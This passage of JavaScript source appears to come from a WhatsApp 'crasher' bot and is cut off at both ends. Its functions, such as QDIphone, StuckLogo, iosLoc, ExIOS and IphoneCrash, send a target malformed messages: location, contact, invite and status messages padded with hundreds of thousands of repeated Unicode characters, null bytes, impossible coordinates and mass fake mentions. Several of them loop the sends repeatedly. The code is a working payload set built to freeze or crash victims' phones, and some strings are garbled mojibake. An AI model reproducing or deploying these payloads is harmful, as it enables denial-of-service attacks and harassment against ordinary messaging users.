                body: "\u0000",
                thumbnailUrl: "",
                sourceUrl: "",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    };

    await sock.sendMessage(
        target,
        locationMessage,
        {
            messageId: `${Date.now()}`,
            participant: target
        }
    );
}

async function QDIphone(sock, target) {
  sock.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "ဤ".repeat(175000),
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩" + "ꦾ࣯࣯".repeat(75000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      paymentInviteMessage: {
        serviceType: "UPI",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}


async function StuckLogo(sock, target) {
  await sock.relayMessage(
    target,
    {
     viewOnceMessage: {
        message: {
           interactiveMessage: {
              header: {
                 locationMessage: {
                    degressLatitude: -0,
                    degressLongitude: 2
                 }
              },
              body: {
                 title: "- # SixEyesXCrashèr ん.? ",
                 hasMediaAttachment: true,
            },
            nativeFlowMessage: {
               messageParamsJson: "{[".repeat(5000),
                  buttons: [
                     {
                        name: "catalog_message",
                        buttonParamsJson: JSON.stringify({
                          note: "Kuntul",
                        }),
                     },
                     {
                        name: "send_location",
                        buttonParamsJson: JSON.stringify({
                          note: "Maklue",
                        }),
                     },
                     {
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                          note: "Maklue",
                        }),
                     }
                  ]
               },
               messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
               }
            }
         }
      }
   },
   {
     messageId: null,
     participant: { jid: target },
   }
 );
  
  await sock.relayMessage(
    target,
    {
      newsletterAdminInviteMessage: {
         newsletterJid: "120363321780343299@newsletter",
         newsletterName: "ꦾ".repeat(45000),
         caption: "ꦽ".repeat(250000),
         inviteExpiration: "909092899",
      },
    },
    {
      messageId: null,
      participant: { jid: target },
    }
  );

  await sock.relayMessage(
    target,
    {
      groupInviteMessage: {
        groupJid: "1@g.us",
        inviteCode: "ꦽ".repeat(29000),
        inviteExpiration: "99999999999",
        groupName:
          "- # SixEyesXCrashèr ん.? " + "ꦾ".repeat(38000),
        caption:
          "- # SixEyesXCrashèr ん.? " + "ꦾ".repeat(35000),
        body: {
          text:
            "\u200B" +
            "ោ៝".repeat(2500) +
            "ꦾ".repeat(25000) +
            "ꦽ".repeat(5000),
        },
      },
    },
    {
      messageId: null,
      participant: { jid: target },
    }
  );
}

async function blankIosNewest(sock, target) {
botTag = Array.from({ length: 20900 }, (_, p) => `8670513176${p}@bot`);
y = Math.floor(Math.random() * 500000000)
yy = `BEGIN:VCARD\nVERSION:3.0\nN:;( • ⟆྄𝐅͢𝚯𝐑͢𝐂𝚺͢ - 𝚺𝐆͢𝐆྄⟅⬩〉# 𝐓𝐫4𝐬𝐡𝐞𝐝 - 𝐓𝐞𝐚𝐦 🎲 ꢵ;;;\nFN:( • ⟆྄𝐅͢𝚯𝐑͢𝐂𝚺͢ - 𝚺𝐆͢𝐆྄⟅⬩〉# 𝐓𝐫4𝐬𝐡𝐞𝐝 - 𝐓𝐞𝐚𝐦 🎲 ꢵ\nORG:mama\nTEL;type=CELL;type=VOICE;waid=5512997641074:+55 12 99764-1074\nEND:VCARD`

for (let i = 0; i < 5; i++) {
const msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
contactsArrayMessage: {
displayName: "X",
contacts: [
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
},
{
displayName: "\u0000".repeat(10000),
vcard: yy
}
],
contextInfo: {
botMessageSharingInfo: {
forwardScore: 9999
},
forwardedAiBotMessageInfo: {
botName: "- # SixEyesXCrashèr ん.? ",
botJid: botTag,
creatorName: "- # SixEyesXCrashèr ん.? "
},
externalAdReply: {
automatedGreetingMessageShown: true,
automatedGreetingMessageCtaType: "\u0000".repeat(100000),
greetingMessageBody: "- # SixEyesXCrashèr ん.? "
}
}
}
}
}
}, { participant: { jid: target } })

await sock.relayMessage(target, msg.message, {})
}
}

async function iosLoc(sock, target) {
  for(let z = 0; z < 10; z++) {
    await sock.relayMessage("status@broadcast", {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: Infinity,
            degreesLongitude: -Infinity,
            name: "- # SixEyesXCrashèr ん.? " + "𑇂𑆵𑆴𑆿".repeat(15000),
            url: `https://iosloc-${"𖣂".repeat(10000)}-xyzzcy.xeter/${"𑇂𑆵𑆴𑆿".repeat(10000)}.html/${"𑇂𑆵𑆴𑆿".repeat(10000)}.php/${"𑇂𑆵𑆴𑆿".repeat(10000)}`,
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
            isLive: true,
            contextInfo: {
              quotedMessage: {
                conversation: "𑇂𑆵𑆴𑆿".repeat(15000),
                type: 1
              }
            }
          }
        }
      }
    },{
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });
  };
  await sleep(1000)
}

async function iosLocSw(sock, target) {
  for (let i = 0; i < 5; i++) {
    await sock.relayMessage('status@broadcast',
      {
        viewOnceMessage: {
          message: {
            locationMessage: {
              degreesLatitude: 1010101,
              degreesLongitude: 1010101,
              name: "- # SixEyesXCrashèr ん.? " + "𑇂𑆵𑆴𑆿".repeat(15000),
              address: "𑇂𑆵𑆴𑆿".repeat(5000),
              url: `https://VaultSuperior.t.me`,
              contextInfo: {
                statusSourceType: "TEXT",
                statusAttributionType: "RESHARED_FROM_MENTION",
                statusAttributions: [
                  {
                    type: "STATUS_MENTION",
                    music: {
                      authorName: "@imortallldo",
                      songId: "1137812656623908",
                      title: "𑇂𑆵𑆴𑆿".repeat(9000),
                      author: "𑇂𑆵𑆴𑆿".repeat(9000),
                      artistAttribution: "https://t.me/imortallldo",
                      isExplicit: true
                    }
                  },
                  {
                    type: 1
                  }
                ]
              }
            }
          }
        }
      },
      {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: 'meta',
            attrs: {},
            content: [
              {
                tag: 'mentioned_users',
                attrs: { status_setting: "contacts" },
                content: [
                  {
                    tag: 'to',
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      }
    )
  };
  await sleep(1000);
}

async function iosTravazLocXtend(sock, target) {
  const TrashIosx = "𑇂𑆵𑆴𑆿".repeat(15000);
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "- # SixEyesXCrashèr ん.? " + TrashIosx,
          matchedText: "- # SixEyesXCrashèr ん.? ",
          description: TrashIosx,
          title: "- # SixEyesXCrashèr ん.? " + TrashIosx,
          previewType: "NONE",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FeXlBRdWjTcoqXLULeMXTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5NX9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCXyLpXWnVZqEYLL9QWasq0sPs5XmHynuU/7dOT10XWmVS0kqt1Qpy13ZzjF/k2avmz7uX/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjXrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEXbm9MsWXvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yxee+S+CBH24vTDsN7aXwjdhGvqve7yaf0yXNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z", 
          thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
          thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
          thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
          mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
          mediaKeyTimestamp: "1743101489",
          thumbnailHeight: 641,
          thumbnailWidth: 640,
          inviteLinkGroupTypeV2: "DEFAULT"
        }
      }
    }
  }, {});

  const msgx = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -9.09999262999,
          degreesLongitude: 199.99963118999,
          jpegThumbnail: null,
          name: "- # SixEyesXCrashèr ん.? " + TrashIosx,
          address: "- # SixEyesXCrashèr ん.? " + TrashIosx,
          url: `https://whatsappx-ios.${TrashIosx}.com`,
        }
      }
    }
  }, {});

  const options = {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: [],
              },
            ],
          },
        ],
      },
    ],
  };

  for (let i = 0; i < 60; i++) {
    await sleep(1000);
    await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      ...options
    });

    await sock.relayMessage('status@broadcast', msgx.message, {
      messageId: msgx.key.id,
      ...options
    });
  }
}

async function ExIOS(sock, target) {
await sock.relayMessage("status@broadcast", {
  extendedTextMessage: {
     text: "- # SixEyesXCrashèr ん.? " + "𑇂𑆵𑆴𑆿".repeat(40000),
     matchedText: "https://t.me/xeternalz_info", 
     jpegThumbnail: null, 
     previewType: 6,
       contextInfo: {
           mentionedJid: Array.from({ length: 512 }, (_, n) => `628${n + 725}@s.whatsapp.net`), 
           isForwarded: true, 
           forwardedNewsletterMessageInfo: {
            newsletterJid: "2111@newsletter", 
            newsletterName: "Fuck U", 
            serverMessageId: 7205
           }
         }
      }
    }, {
       statusJidList: [target],
       additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "contacts" },
            content: [
             {
              tag: "mentioned_users",
              attrs: {},
              content: [
               {
                tag: "to",
                attrs: { jid: target },
                content: []
               }
             ]
           }
         ]
       }
     ]
  });
}

async function TrashIPhoneV1(sock, target) {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: slash,
         name: "- # SixEyesXCrashèr ん.? ⭒ t.me/xyzzcyyy  " + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "- # SixEyesXCrashèr ん.? ⭒ t.me/xyzzcyyy " + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
    
  await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
            content: [{
              tag: 'to',
              attrs: {
                jid: target
              },
                content: undefined
               }]
            }]
        }]
    });
    await sleep(1000)
 }

async function IphoneCrash(sock, target) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "- # SixEyesXCrashèr ん.? " + "𑇂𑆵𑆴𑆿".repeat(15000),
         address: "- # SixEyesXCrashèr ん.? " + "𑇂𑆵𑆴𑆿".repeat(5000),
         url: `https://${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = await generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "馃懆馃徔鈥嶐煃� 饾樋谭饾櫄饾櫕饾櫎饾櫑饾櫒谭饾櫈饾櫗饾櫂饾櫎饾櫑饾櫄谭_,-,_ 馃И饾棓谭饾椈饾棻 #谭 饾棪谭饾椀饾椉饾槃饾棦谭饾棾饾棔饾槀饾棿谭 @饾棝谭饾棶饾椊饾暋饾槅饾棖谭饾椉饾椇饾櫌饾槀饾椈饾椂饾榿饾櫘 馃檲\n\n# _ - https://t.me/rxhlvro - _ #",
            matchedText: "https://t.me/xyzzcyyy",
            description: "- # SixEyesXCrashèr ん.? ⭒ t.me/xyzzcyyy " + "饝噦饝喌饝喆饝喛".repeat(15000),
            title: "- # SixEyesXCrashèr ん.? ⭒ t.me/xyzzcyyy " + "饝噦饝喌饝喆饝喛".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = await generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
